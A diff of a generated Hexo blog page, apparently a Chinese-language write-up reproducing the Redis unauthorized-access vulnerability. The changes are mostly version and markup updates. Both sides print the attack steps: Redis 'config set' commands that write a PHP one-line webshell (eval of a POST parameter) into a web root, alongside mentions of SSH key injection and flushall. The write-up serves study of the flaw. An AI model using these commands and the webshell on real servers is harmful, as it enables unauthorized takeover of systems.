@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      14
        分钟
     </span>
   
@@ -246,7 +246,7 @@
               </p>
             
             <div class="markdown-body" id="post-body">
-              <h1 id="redis未授权访问漏洞复现"><a href="#redis未授权访问漏洞复现" class="headerlink" title="redis未授权访问漏洞复现"></a>redis未授权访问漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+              <h1 id="redis未授权访问漏洞复现"><a href="#redis未授权访问漏洞复现" class="headerlink" title="redis未授权访问漏洞复现"></a>redis未授权访问漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
 <p>该漏洞的产生条件有以下两点：</p>
 <p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
 <p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
@@ -264,11 +264,11 @@ make <span class="hljs-comment">#编译安装</span></code></pre></div>
 <p>vim redis.conf #修改默认配置文件</p>
 <p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" srcset="/img/loading.gif" alt="image-20210414153138387"></p>
-<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
-<div class="hljs"><pre><code class="hljs awk">cd src
-cp redis-cli <span class="hljs-regexp">/usr/</span>bin
-cp redis-server <span class="hljs-regexp">/usr/</span>bin
-cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre></div>
+<p>然后进入src目录，将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到&#x2F;etc&#x2F;目录下。</p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> src
+<span class="hljs-built_in">cp</span> redis-cli /usr/bin
+<span class="hljs-built_in">cp</span> redis-server /usr/bin
+<span class="hljs-built_in">cp</span> redis.conf /etc/</code></pre></div>
 
 <p>开启redis服务</p>
 <div class="hljs"><pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre></div>
@@ -289,13 +289,13 @@ cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre></div>
 <p>成功控制目标的redis服务</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" srcset="/img/loading.gif" alt="image-20210413230028713"></p>
 <p>向其网站根目录中写入一句话木马</p>
-<div class="hljs"><pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>
-
-<span class="xml">config set dbfilename shell.php</span>
-
-<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>
-
-<span class="xml">save </span></code></pre></div>
+<div class="hljs"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span>
+<span class="language-xml"></span>
+<span class="language-xml">config set dbfilename shell.php</span>
+<span class="language-xml"></span>
+<span class="language-xml">set x &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span>
+<span class="language-xml"></span>
+<span class="language-xml">save </span></code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" srcset="/img/loading.gif" alt="image-20210413230359912"></p>
 <p>save成功后，目标主机的网站根目录就出现了木马文件</p>
